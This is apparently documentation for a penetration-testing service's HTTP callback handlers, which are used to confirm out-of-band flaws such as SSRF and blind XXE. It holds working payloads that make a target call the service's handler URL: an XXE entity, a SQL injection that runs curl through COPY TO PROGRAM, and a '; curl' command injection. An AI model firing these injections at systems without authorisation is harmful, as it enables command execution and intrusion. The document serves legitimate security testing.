## Overview

HTTP Handlers provide endpoints for capturing HTTP callbacks, useful for validating out-of-band vulnerabilities like SSRF, XXE, and blind injection attacks.

## How to use

<Steps>
  <Step title="Create handler">
    Generate a unique handler endpoint.
  </Step>
  <Step title="Use in testing">
    Include handler URL in test payloads.
  </Step>
  <Step title="Trigger vulnerability">
    Submit payloads to the target.
  </Step>
  <Step title="Check results">
    View captured callbacks.
  </Step>
</Steps>

## Use cases

### SSRF testing

Test if the server makes outbound requests:
```
https://handler.pentest-tools.com/h/YOUR_ID
```

### XXE testing

External entity payload:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://handler.pentest-tools.com/h/YOUR_ID">]>
```

### Blind SQL injection

Time-based with HTTP callback:
```sql
'; SELECT pg_sleep(5); COPY (SELECT 'test') TO PROGRAM 'curl https://handler.pentest-tools.com/h/YOUR_ID'; --
```

### Command injection

```bash
; curl https://handler.pentest-tools.com/h/YOUR_ID
```

## Captured data

For each callback:
- Timestamp
- Source IP address
- HTTP method
- Request headers
- Request body
- Query parameters

## Handler features

| Feature | Description |
|---------|-------------|
| Unique URLs | Isolate test cases |
| Real-time | Instant notifications |
| Persistent | Callbacks stored for review |
| Searchable | Filter by time, IP, etc. |

<Tip>
Use unique handler IDs for each test case to easily correlate which payload triggered which callback.
</Tip>

## Important notes

<Note>
HTTP handlers help prove out-of-band vulnerabilities that would otherwise be difficult to demonstrate. They're essential for SSRF and blind XXE testing.
